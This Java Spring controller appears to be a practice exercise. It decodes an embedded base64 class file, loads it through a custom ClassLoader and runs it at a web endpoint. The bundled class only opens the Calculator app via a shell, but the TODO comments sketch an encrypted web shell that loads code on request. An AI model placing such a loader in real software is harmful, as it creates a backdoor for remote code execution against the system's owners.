package com.sorry.saury.Controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import sun.misc.BASE64Decoder;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@Controller
public class DefineClassController {
    class R extends ClassLoader{
        public Class e(byte[] b){
            //暂时可用
            return super.defineClass(b,0,b.length);
        }
    }
    @RequestMapping("/day2")
    public void echo(HttpServletRequest req, HttpServletResponse rsp) {
        // defineClass测试

        try {
            PrintWriter writer = rsp.getWriter();
            String classStr = "yv66vgAAADQAXAoAFwAyBwAzBwA0CAA1CAA2CAA3CgACADgHADkKAAIAOgoAOwA8CgAXAD0KAAgAPggAPwoACABABwBBCgAPAEIJAEMARAgARQoARgBHCABIBwBJCgAVADIHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEABHRoaXMBACBMY29tL3NvcnJ5L2RheTEvVGVzdC9DYWxjdWxhdG9yOwEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEADVN0YWNrTWFwVGFibGUHAEkHADMHAEEBAARlY2hvAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAWMBAApFeGNlcHRpb25zBwBLAQAQTWV0aG9kUGFyYW1ldGVycwEAClNvdXJjZUZpbGUBAA9DYWxjdWxhdG9yLmphdmEMABgAGQEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAChvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAYACkBABFqYXZhL3V0aWwvU2Nhbm5lcgwATABNBwBODABPAFAMAFEAUgwAGABTAQACXEEMAFQAVQEAE2phdmEvaW8vSU9FeGNlcHRpb24MAFYAGQcAVwwAWABZAQAYZGVmaW5lIGNsYXNzIHN1Y2Nlc3NmdWwhBwBaDABbAFMBABV0aGlzIHdpbGwgbm90IGJlIGluaXQBAB5jb20vc29ycnkvZGF5MS9UZXN0L0NhbGN1bGF0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABUAFwAAAAAAAwABABgAGQABABoAAADCAAYAAwAAAEcqtwABuwACWQa9AANZAxIEU1kEEgVTWQUSBlO3AAdMuwAIWSu2AAm2AAq2AAu3AAwSDbYADk2nAAhNLLYAELIAERIStgATsQABAB8ANgA5AA8AAwAbAAAAIgAIAAAABwAEAAkAHwALADYADgA5AAwAOgANAD4ADwBGABAAHAAAACAAAwA6AAQAHQAeAAIAAABHAB8AIAAAAB8AKAAhACIAAQAjAAAAEwAC/wA5AAIHACQHACUAAQcAJgQAAQAnABkAAQAaAAAANwACAAEAAAAJsgAREhS2ABOxAAAAAgAbAAAACgACAAAAEgAIABMAHAAAAAwAAQAAAAkAHwAgAAAACQAoACkAAwAaAAAAQQACAAIAAAAJuwAVWbcAFkyxAAAAAgAbAAAACgACAAAAFgAIABgAHAAAABYAAgAAAAkAKgArAAAACAABACwAIAABAC0AAAAEAAEALgAvAAAABQEAKgAAAAEAMAAAAAIAMQ==";
            BASE64Decoder code=new sun.misc.BASE64Decoder();
            Class result=new R().e(code.decodeBuffer(classStr));
            writer.write(result.newInstance().toString());
            writer.flush();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
          catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
        // TODO S1.密钥交互
        // TODO S2.接收加密二进制
        // TODO S3.defineClass执行后返回相应结果


    }
}
